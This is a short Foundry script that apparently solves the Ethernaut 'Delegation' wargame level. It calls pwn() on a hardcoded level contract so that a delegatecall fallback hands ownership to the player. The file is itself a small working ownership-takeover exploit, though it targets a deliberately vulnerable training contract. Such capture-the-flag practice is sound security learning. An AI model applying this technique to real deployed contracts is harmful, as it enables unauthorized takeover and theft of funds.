// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";

interface Delegation {
    function pwn() external;
}

contract DelegationScript is Script {

    function run() external {
        address player = 0xcd3169acB437745ee541Cf285F466800aC25EdF1;
        address level = 0x8F181F0f36d6bfC2E7b65E1283659C841E9be596;

        vm.startBroadcast();
        Delegation del = Delegation(level);
        del.pwn();
        vm.stopBroadcast();
    }

}